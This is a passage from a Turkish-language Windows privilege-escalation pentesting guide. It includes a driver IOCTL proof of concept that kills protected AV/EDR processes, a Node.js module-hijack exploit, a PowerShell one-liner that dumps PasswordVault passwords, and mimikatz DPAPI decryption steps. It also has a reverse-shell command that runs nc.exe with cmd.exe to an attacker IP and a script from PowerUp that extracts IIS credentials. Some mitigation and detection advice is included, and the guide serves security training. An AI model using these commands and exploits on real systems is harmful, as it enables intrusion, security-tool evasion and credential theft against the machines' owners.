- Rastgele process'lere full-access handle döndürme (token theft / DuplicateTokenEx/CreateProcessAsUser üzerinden SYSTEM shell).
- Kısıtlamasız raw disk read/write (offline tampering, boot-time persistence hileleri).
- Protected Process/Light (PP/PPL) dahil olmak üzere rastgele process'leri sonlandırma; böylece kernel üzerinden user land'den AV/EDR kill gerçekleştirme.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Geliştiriciler için azaltma önlemleri
- DACL ile erişimi kısıtlanması amaçlanan aygıt nesnelerini oluştururken her zaman FILE_DEVICE_SECURE_OPEN ayarlayın.
- Ayrıcalıklı işlemler için çağıranın bağlamını doğrulayın. İşlemin sonlandırılmasına veya handle döndürülmesine izin vermeden önce PP/PPL kontrolleri ekleyin.
- IOCTL'leri kısıtlayın (erişim maskeleri, METHOD_*, girdi doğrulaması) ve doğrudan kernel ayrıcalıkları yerine brokered modelleri değerlendirin.

Savunmacılar için tespit fikirleri
- Şüpheli aygıt adlarına (ör. \\ .\\amsdk*) yönelik user-mode açma işlemlerini ve kötüye kullanıma işaret eden belirli IOCTL dizilerini izleyin.
- Microsoft’un savunmasız sürücü engelleme listesini (HVCI/WDAC/Smart App Control) uygulayın ve kendi allow/deny listelerinizi güncel tutun.


## PATH DLL Hijacking

**PATH üzerindeki bir klasörde yazma izinleriniz** varsa, bir işlem tarafından yüklenen bir DLL’i hijack ederek **ayrıcalıkları yükseltebilirsiniz**.<sup>[[2]](#references)</sup>

PATH içindeki tüm klasörlerin izinlerini kontrol edin:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Daha fazla bilgi için bu denetimin nasıl kötüye kullanılabileceğine bakın:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## `C:\node_modules` üzerinden Node.js / Electron modül çözümleme hijacking'i

Bu, `require("foo")` gibi yalın bir import yaptıklarında ve beklenen modül **bulunmadığında** **Node.js** ve **Electron** uygulamalarını etkileyen bir **Windows denetimsiz arama yolu** çeşididir.<sup>[[20]](#references)</sup>

Node, dizin ağacında yukarı doğru ilerleyerek her üst dizindeki `node_modules` klasörlerini denetler. Windows'ta bu arama sürücü köküne kadar ulaşabilir. Bu nedenle `C:\Users\Administrator\project\app.js` konumundan başlatılan bir uygulama şunları arayabilir:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

**Düşük ayrıcalıklı bir kullanıcı** `C:\node_modules` oluşturabiliyorsa kötü amaçlı bir `foo.js` (veya paket klasörü) yerleştirip, **daha yüksek ayrıcalıklı bir Node/Electron işleminin** bulunamayan bağımlılığı çözümlemesini bekleyebilir. Payload, kurban işleminin güvenlik bağlamında çalışır. Bu nedenle hedef yönetici olarak, yükseltilmiş bir zamanlanmış görev/hizmet sarmalayıcısından ya da otomatik başlatılan ayrıcalıklı bir masaüstü uygulamasından çalışıyorsa bu durum **LPE**'ye dönüşür.

Bu durum özellikle şu senaryolarda yaygındır:

- bir bağımlılık `optionalDependencies` içinde bildirilmişse<sup>[[22]](#references)</sup>
- üçüncü taraf bir kütüphane `require("foo")` çağrısını `try/catch` içine alıp hata durumunda çalışmaya devam ediyorsa
- bir paket üretim derlemelerinden kaldırılmışsa, paketleme sırasında atlanmışsa veya kurulumu başarısız olmuşsa
- savunmasız `require()` çağrısı ana uygulama kodu yerine bağımlılık ağacının derinlerinde bulunuyorsa

### Savunmasız hedefleri arama

Çözümleme yolunu doğrulamak için **Procmon** kullanın:<sup>[[23]](#references)</sup>

- `Process Name` = hedef yürütülebilir dosya (`node.exe`, Electron uygulamasının EXE'si veya sarmalayıcı işlem) olacak şekilde filtreleyin
- `Path` alanında `node_modules` geçen kayıtları filtreleyin
- `NAME NOT FOUND` kayıtlarına ve `C:\node_modules` altındaki son başarılı açma işlemine odaklanın

Paketlenmemiş `.asar` dosyalarında veya uygulama kaynaklarında aranabilecek kod inceleme kalıpları:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Procmon veya kaynak incelemesiyle **eksik paket adını** belirleyin.
2. Henüz yoksa root arama dizinini oluşturun:

```powershell
mkdir C:\node_modules
```

3. Tam olarak beklenen ada sahip bir modül bırakın:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Kurban uygulamayı tetikleyin. Uygulama `require("foo")` çağrısı yaparsa ve meşru modül mevcut değilse Node, `C:\node_modules\foo.js` dosyasını yükleyebilir.

Bu örüntüye uyan eksik isteğe bağlı modüllere gerçek dünyadan örnekler `bluebird` ve `utf-8-validate`'tır; ancak yeniden kullanılabilir olan **technique**'tir: ayrıcalıklı bir Windows Node/Electron sürecinin çözeceği herhangi bir **missing bare import** bulun.

### Tespit ve güçlendirme fikirleri

- Bir kullanıcı `C:\node_modules` oluşturduğunda veya buraya yeni `.js` dosyaları/paketleri yazdığında uyarı verin.
- `C:\node_modules\*` konumundan okuma yapan yüksek bütünlük düzeyindeki süreçleri araştırın.
- Üretimde tüm runtime dependencies öğelerini paketleyin ve `optionalDependencies` kullanımını denetleyin.
- Üçüncü taraf kodlarda `try { require("...") } catch {}` gibi sessiz örüntüleri inceleyin.
- Kitaplık destekliyorsa isteğe bağlı kontrolleri devre dışı bırakın (örneğin, bazı `ws` dağıtımları `WS_NO_UTF_8_VALIDATE=1` ile eski `utf-8-validate` kontrolünden kaçınabilir).

## Ağ

### Paylaşımlar

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hosts dosyası

hosts dosyasında sabit kodlanmış diğer bilinen bilgisayarları kontrol edin.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Ağ Arayüzleri ve DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Açık Portlar

Dışarıdan **kısıtlanmış servisleri** kontrol edin.

```bash
netstat -ano #Opened ports?
```

Yerel bir listener için PID'yi işlem sahibi, çalıştırılabilir dosyanın yolu ve onu başlatan service veya scheduled task ile ilişkilendirin. Bir remote-control service, yalnızca kimlik doğrulaması ve komut denetimleri izin veriyorsa masaüstü kullanıcısı olarak erişim sağlayabilir. Daha yüksek ayrıcalıklara sahip bir hesapla çalışan özel bir TCP uygulaması ayrı bir inceleme hedefidir: listener ve binary yolu pasif ipuçlarıdır; kimliği doğrulanmış bir bellek bozulması yolu ise söz konusu binary'nin ve erişilebilir girdisinin analiz edilmesini gerektirir. Açık bir portun bir sistem işlemine ait olduğu görülüyorsa, arka uç service'e atfetmeden önce [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) çıktısıyla karşılaştırın; tek başına bir iletme kuralı, hedefe erişilebildiğini veya hedefin savunmasız olduğunu kanıtlamaz.

### Yönlendirme Tablosu

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### ARP Tablosu

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Güvenlik Duvarı Kuralları

[**Güvenlik Duvarı ile ilgili komutlar için bu sayfaya bakın**](../basic-cmd-for-pentesters.md#firewall) **(kuralları listeleme, kural oluşturma, kapatma, kapatma...)**

[Ağ keşfi için daha fazla komut burada](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

`bash.exe` binary dosyası `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` konumunda da bulunabilir.

`root` kullanıcısı olursanız herhangi bir portta dinleme yapabilirsiniz (`nc.exe` ile bir portu dinlemek için ilk kez kullandığınızda, GUI üzerinden `nc`'ye güvenlik duvarı izni verilip verilmeyeceği sorulur).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Bash'i root olarak kolayca başlatmak için `--default-user root` seçeneğini deneyebilirsiniz.

`WSL` dosya sistemini `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` klasöründe inceleyebilirsiniz.

WSL içindeki Linux `root` hesabı tek başına Windows Administrator yetkileri sağlamaz. Mevcut Windows kimliği bir dağıtımın dosya sistemini okuyabiliyorsa, kimlik bilgilerini kaydetmiş olabilecek komutlar için kabuk geçmişi dosyalarını ( `/root/.bash_history` dahil) inceleyin; yükseltme için yine de daha yüksek ayrıcalıklara sahip geçerli bir hesap ve izin verilen bir kimlik doğrulama yolu gerekir. `LocalState\rootfs` düzeni eski WSL kurulumları için geçerlidir; WSL 2 genellikle dağıtımı bir [`ext4.vhdx` sanal diskinde](https://learn.microsoft.com/en-us/windows/wsl/disk-space) depolar. Bu nedenle önce gerçek dağıtımı ve depolama yolunu belirleyin. Otomatik numaralandırma sırasında geçmiş içeriğini ekrana yazdırmaktan kaçının.

## Windows Credentials

### Winlogon Credentials

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

`DefaultUserName` ve `DefaultDomainName` değerlerini kimlik bilgileri değil, hesap bağlamı olarak değerlendirin. Boş olmayan bir `DefaultPassword` veya `AltDefaultPassword` değeri, kayıt defterinde düz metin olarak bulunan bir bulgudur. `AutoAdminLogon=1` ayarlıysa ancak düz metin parola okunamıyorsa, bu yalnızca bir ipucudur: [Sysinternals Autologon parolayı LSA secret olarak depolayabilir](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon) ve sıradan kayıt defteri okumaları, bu secret'ın var olup olmadığını veya elde edilip edilemeyeceğini ortaya koymaz. Kimlik bilgilerinin açığa çıktığını bildirmeden önce erişim haklarını ve gerçek oturum açma yapılandırmasını inceleyin.

### Kimlik bilgileri yöneticisi / Windows vault

[https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup> kaynağından\
Windows Vault, **Windows**'un **kullanıcıları otomatik olarak oturum açtırmak** için kullanabileceği sunuculara, web sitelerine ve diğer programlara ait kullanıcı kimlik bilgilerini depolar. İlk bakışta bu, kullanıcıların Facebook, Twitter veya Gmail gibi siteler için kimlik bilgilerini depolayıp tarayıcıların otomatik olarak oturum açmasını sağlayabileceği anlamına geliyor gibi görünebilir, ancak sistem bu şekilde çalışmaz.

Windows Vault, Windows'un kullanıcıları otomatik olarak oturum açtırabileceği kimlik bilgilerini depolar. Bu da, bir kaynağa (sunucu veya web sitesi) erişmek için kimlik bilgilerine ihtiyaç duyan herhangi bir **Windows uygulamasının** bu Credential Manager ve Windows Vault'tan **yararlanabileceği** ve kullanıcılara sürekli kullanıcı adı ve parola girmek yerine sağlanan kimlik bilgilerini kullanabileceği anlamına gelir.

Uygulamalar Credential Manager ile etkileşime girmediği sürece, belirli bir kaynağa ait kimlik bilgilerini kullanmalarının mümkün olduğunu sanmıyorum. Dolayısıyla, uygulamanız vault'tan yararlanmak istiyorsa, varsayılan depolama vault'undan o kaynağa ait kimlik bilgilerini istemek için bir şekilde **Credential Manager ile iletişim kurmalıdır**.

Makinede depolanan kimlik bilgilerini listelemek için `cmdkey` kullanın.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Ardından kaydedilmiş kimlik bilgilerini kullanmak için `/savecred` seçeneğiyle `runas` kullanabilirsiniz. Aşağıdaki örnek, bir SMB paylaşımı üzerinden uzak bir ikili dosyayı çağırıyor.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Sağlanan bir kimlik bilgisi kümesiyle `runas` kullanma.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) veya [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) üzerinden de.

### UWP PasswordVault / Credential Locker

Modern Windows UWP uygulamaları, Microsoft Edge ve modern sistem hizmetleri; kimlik doğrulama token'larını ve düz metin parolaları Universal Windows Platform (UWP) `PasswordVault` içinde depolar (`vaultcmd` içinde `Web Credentials` olarak da gösterilir). Bu depolama alanı oturumdan yalıtılmıştır ve yönetici veya `SeDebugPrivilege` hakları olmadan yerel olarak çözülebilir.

Depolanan tüm kullanıcı adlarını ve düz metin parolaları anında dökmek ve şifrelerini çözmek için bu PowerShell komutunu kullanıcının etkin oturumunda çalıştırın:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)**, verilerin simetrik olarak şifrelenmesini sağlayan bir yöntem sunar ve Windows işletim sisteminde çoğunlukla asimetrik özel anahtarların simetrik olarak şifrelenmesinde kullanılır. Bu şifreleme, entropiye önemli ölçüde katkı sağlamak için bir kullanıcı veya sistem sırrından yararlanır.

**DPAPI, kullanıcının oturum açma sırlarından türetilen bir simetrik anahtar aracılığıyla anahtarların şifrelenmesini sağlar**. Sistem şifrelemesi söz konusu olduğunda, sistemin etki alanı kimlik doğrulama sırlarını kullanır.

DPAPI kullanılarak şifrelenen kullanıcı RSA anahtarları, `{SID}` kullanıcının [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) değerini temsil etmek üzere `%APPDATA%\Microsoft\Protect\{SID}` dizininde saklanır. **Kullanıcının özel anahtarlarını koruyan ana anahtarla aynı dosyada bulunan DPAPI anahtarı** genellikle 64 baytlık rastgele veriden oluşur. (Bu dizine erişimin kısıtlı olduğunu ve içeriğinin CMD'deki `dir` komutuyla listelenemediğini, ancak PowerShell üzerinden listelenebildiğini unutmayın.)

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Uygun argümanlarla (`/pvk` veya `/rpc`) bu dosyanın şifresini çözmek için **mimikatz module** `dpapi::masterkey` kullanabilirsiniz.

**master password ile korunan credentials files** genellikle şurada bulunur:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

`/masterkey` parametresiyle uygun **mimikatz module**'ünü `dpapi::cred` kullanarak şifreyi çözebilirsiniz.\
`sekurlsa::dpapi` modülüyle **memory**'den birçok DPAPI **masterkey**'i **extract** edebilirsiniz (root iseniz).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Kimlik Bilgileri

**PowerShell kimlik bilgileri**, şifrelenmiş kimlik bilgilerini kolayca saklama yöntemi olarak **scripting** ve otomasyon görevlerinde sıkça kullanılır. Kimlik bilgileri **DPAPI** kullanılarak korunur; bu da genellikle yalnızca oluşturuldukları bilgisayardaki aynı kullanıcı tarafından şifrelerinin çözülebileceği anlamına gelir.

Dışa aktarılmış bir kimlik bilgisi rastgele bir dosya adına veya `.xml` yoluna sahip olabilir. Bir script ya da dosya envanteri böyle bir dosyaya işaret ettiğinde, `C:\Users` konumunu varsaymak yerine hesabın gerçek profil dizinini bulun: [Windows profilleri başka konumlara yerleştirebilir](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Dosyanın okunabilir olması yalnızca bir ipucudur; [Windows `Export-Clixml`, şifrelenmiş bir kimlik bilgisini dışa aktaran kullanıcıya ve bilgisayara bağlar](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml) ve bulunan hesabın hedef hizmette ayrıca geçerli yetkilere sahip olması gerekir. Rutin envanter çıkarma sırasında şifrelenmiş veya düz metin değerleri yazdırmadan önce yolları ve ACL'leri inceleyin.

Bir dosyada bulunan PS kimlik bilgilerinin **şifresini çözmek** için şunu yapabilirsiniz:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Kaydedilmiş RDP Bağlantıları

Bunları `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
ve `HKCU\Software\Microsoft\Terminal Server Client\Servers` altında bulabilirsiniz.

### Yakın Zamanda Çalıştırılan Komutlar

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Uzak Masaüstü Kimlik Bilgisi Yöneticisi**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

**Mimikatz** `dpapi::rdg` modülünü uygun `/masterkey` ile kullanarak **.rdg dosyalarının şifresini çözün**\
Bellekten birçok DPAPI masterkey **çıkarmak** için Mimikatz `sekurlsa::dpapi` modülünü kullanabilirsiniz

**mRemoteNG farklı bir bağlantı deposu kullanır.** `%APPDATA%\mRemoteNG` ve kullanıcının Documents klasöründeki okunabilir XML dosyalarını, `config.xml` gibi sıradan adlara sahip dosyalar da dahil olmak üzere inceleyin. Bir XML dosyasını kimlik bilgileri için olası bir kaynak olarak değerlendirmeden önce bağlantı şemasını ve şifrelenmiş `Password` özniteliklerini belirleyin. Saklanan değer bir DPAPI/RDCMan parolası değildir; kurtarma, dosyanın şifreleme ayarlarına ve özel bir ana parola kullanılıp kullanılmadığına bağlıdır. Geniş kapsamlı tarama sırasında şifrelenmiş değerleri yazdırmaktan kaçının.

**Remote Desktop Plus profil dışa aktarımları** kullanıcı dizinlerinde veya paylaşılan bir yönetim klasöründe okunabilir durumda bulunabilir. Eski bir `profiles.xml` dışa aktarımında `ProfileName`, `Password` ve `Secure` öğelerini içeren `Data/Profile` girdileri bulunur. Boş olmayan bir parola öğesini, yazdırmadan veya düz metin olduğunu varsaymadan, olası bir kimlik bilgisi kaynağı olarak değerlendirin: [üreticinin belirttiğine göre](https://www.donkz.nl/) profil koruması, profili oluşturan hesaba ve bilgisayara bağlanabilir veya daha az sıkı yapılandırılabilir. Bu dosyaya güvenmeden önce kaynağını ve kurtarma koşullarını doğrulayın.

### Sticky Notes

Kullanıcılar bazen parola ve başka bilgileri yapışkan not uygulamalarına kaydeder. Microsoft'un paketlenmiş Sticky Notes uygulaması notları genellikle `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` konumunda saklar; eski veya farklı uygulamalar, LevelDB dahil olmak üzere başka kullanıcı profili depoları kullanabilir. Eksik bir SQLite dosyasını notların bulunmadığının kanıtı saymadan önce yüklü uygulamayı ve depolama biçimini belirleyin.

Sticky Notes SQLite write-ahead logging kullanıyorsa, yalnızca `plum.sqlite` dosyasının kopyası yakın zamanda kaydedilmiş notları içermeyebilir. Veritabanının tutarlı bir kopyasıyla birlikte eşleşen `plum.sqlite-wal` dosyasını da alın; varsa `plum.sqlite-shm` dosyasını da ekleyin. Paylaşılan bellek dizini yeniden oluşturulabilir, ancak WAL veritabanının kalıcı durumunun bir parçasıdır. [SQLite'ın WAL belgelerine](https://www.sqlite.org/wal.html) bakın. Hesap adı veya parola içeren bir not yalnızca olası bir kimlik bilgisi kaynağıdır: hesabı, izin verilen erişimi ve parola tekrar kullanımını ayrıca doğrulayın. Şifrelenmiş bir parola yöneticisi kaydı, daha yüksek ayrıcalıklı bir oturum açmayı kanıtlayabilmek için gerçek şifre çözme anahtarını ve uygulamaya özgü yorumlamayı da gerektirir.

### AppCmd.exe

**AppCmd.exe'den parolaları kurtarmak için Administrator olmanız ve High Integrity düzeyinde çalıştırmanız gerektiğini unutmayın.**\
**AppCmd.exe**, `%systemroot%\system32\inetsrv\` dizininde bulunur.\
Bu dosya varsa bazı **kimlik bilgileri** yapılandırılmış ve **kurtarılabilir** olabilir.

Bu kod [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) içinden alınmıştır:

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` dosyasının mevcut olup olmadığını kontrol edin .\
Yükleyiciler **SYSTEM ayrıcalıklarıyla çalıştırılır** ve birçoğu **DLL Sideloading'e karşı savunmasızdır (Bilgi kaynağı:** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Dosyalar ve Kayıt Defteri (Kimlik Bilgileri)

### Destek aracı kayıt defteri kimlik bilgisi kalıntıları

Bazı eski uzaktan destek kurulumları, sabit uygulama kayıt defteri anahtarları altında parolayla ilgili değer adlarını korur. Örneğin, [satıcının kayıt defteri anahtarı açıklamasına](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988) göre TeamViewer'ın `SecurityPasswordAES` değeri, 9'dan önceki sürümlerde yapılandırılmış statik oturum parolasını tanımlıyordu. Bir değer adı işareti yalnızca inceleme için ipucudur: bu kimlik bilgisini değerlendirirken kurulu sürümü, okunabilir değer verisini, biçimi ve mevcut kimlik doğrulama davranışını doğrulayın. Uzaktan destek parolasından daha ayrıcalıklı bir Windows hesabına geçiş için ayrıca parolanın gerçekten yeniden kullanılması ve bu hesaba yetki verilmiş olması gerekir. Şifreli verileri ve kurtarılan parolaları rutin sayım çıktılarında göstermeyin.

### Korumalı sayfaları olan paylaşılan elektronik tablolar

Okunabilir ve paylaşılan bir çalışma kitabının hesap verileri içerdiğinden şüpheleniliyorsa, **dosya şifrelemesini** çalışma sayfası korumasından veya gizli sütunlardan ayırın. [Microsoft'un belirttiğine göre](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel), çalışma sayfası koruması düzenlemeyi denetler ve bir güvenlik özelliği değildir; tek başına çalışma kitabı içeriğinin şifrelendiğini göstermez. Yalnızca yetkili olduğunuz ilgili dosyaları inceleyin ve geniş kapsamlı sayım sırasında olası sırları yazdırmaktan kaçının. Okunabilir bir `.xlsx` yolu, korumalı bir sayfa veya gizli bir sütun tek başına kimlik bilgilerinin var olduğunu ya da herhangi bir hesabın daha yüksek ayrıcalıklara sahip olduğunu kanıtlamaz; gerçek verileri ve mevcut hesap haklarını ayrı ayrı doğrulayın.

### CI sunucusunda tutulan değişiklik yamaları

Bir CI sunucusu, derleme tamamlandıktan sonra bile gönderilen kaynak değişikliklerini veri dizininde tutabilir. [TeamCity,](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) `system/changes` yolunu uzaktan çalıştırma değişikliklerinin depolandığı konum olarak belgeler; veri dizini yapılandırılabilir ve mutlaka `ProgramData` altında bulunması gerekmez. Okunabilir bir yama; kimlik bilgisi dosyasına, şifreleme anahtarına veya her ikisini kullanan bir betiğe yönelik eklenmiş ya da kaldırılmış referansları koruyabilir. Örneğin, PowerShell'deki `ConvertTo-SecureString -Key` iş akışı AES anahtarının yanı sıra şifrelenmiş dizgeyi de gerektirir; [Microsoft,](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) anahtarın ayrıca sağlandığını belgeliyor. Önce yalnızca erişilebilir yama adlarını inceleyin, ardından sırları rutin sayım çıktılarında göstermeden ilgili içeriği yetki dahilinde inceleyin. Bir yama yolu, şifrelenmiş değer veya anahtar referansı tek başına geçerli bir kimlik bilgisini ya da daha yüksek ayrıcalıklı erişimi kanıtlamaz. Veri dizini ACL'lerini kısıtlayın ve sırlara derleme değişikliklerinde yer vermekten kaçının.

### Özel yerel yönetici parolası rotasyonu

